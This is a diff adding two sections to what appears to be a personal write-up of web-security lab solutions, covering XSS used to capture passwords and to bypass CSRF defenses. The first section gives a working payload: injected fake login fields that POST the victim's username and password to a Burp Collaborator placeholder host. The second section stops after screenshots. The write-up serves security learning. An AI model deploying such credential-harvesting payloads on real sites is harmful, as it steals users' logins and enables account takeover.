@@ -743,6 +743,75 @@ body:document.cookie --> getting the session cookie.
 
 # ------------------------------------------------------------------------------
 
+# 23. Exploiting cross-site scripting to capture passwords.
+
+<img width="754" height="138" alt="image" src="https://github.com/user-attachments/assets/455d0bf7-b6b6-4484-872c-f8eccec46437" />
+
+### Goal : To exfiltrate victim username and password and ten use these credentials to login. 
+
+### Ingredients : Home, myaccount and viewpost button. 
+
+<img width="999" height="609" alt="image" src="https://github.com/user-attachments/assets/fa747a87-2657-497b-a466-f79148cfc965" />
+
+### Solving : 
+
+- We are going to exploit the comment section on the post that is very vulnerable.
+- We are going to fetch the username and password making an input field near the comment section when user enter teh credentials the script will send it to the collobartor server and there we can collect that.
+- So here the is the script.
+
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+
+- Creating two tab naming username and password when user typing anything there it will automatically fetch that and send to burp collobarator.
+
+<img width="805" height="554" alt="image" src="https://github.com/user-attachments/assets/dd14f2f5-71f0-455b-b539-1959883fd74c" />
+
+<img width="1017" height="597" alt="image" src="https://github.com/user-attachments/assets/5265d0f8-acd8-4e5c-a755-ae840c6b0370" />
+
+- We can see username and the password is in the request.
+
+- Hence by doing this we can solve the lab.
+
+
+# ------------------------------------------------------------------------------
+
+
+# 23. Exploiting XSS to bypass CSRF defenses.
+
+<img width="744" height="142" alt="image" src="https://github.com/user-attachments/assets/c01e403b-597f-47e4-b789-bef0a67f3fd3" />
+
+### Goal : Steal the CSRF token and use that to change the email address of someone who views the blog post comments. 
+
+### Ingredients : Same as above. 
+
+### Solving : 
+
+- Log in as the regualar user and updating the email.
+
+<img width="866" height="382" alt="image" src="https://github.com/user-attachments/assets/5d8290a6-2bf6-420e-b65f-718c03b25752" />
+
+- When we capturing the response in the burp suite one of the request as header /my-account/change-email it has the csrf token. 
+
+<img width="605" height="421" alt="image" src="https://github.com/user-attachments/assets/e67d1071-a819-4066-ac94-0b7efd7d5608" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
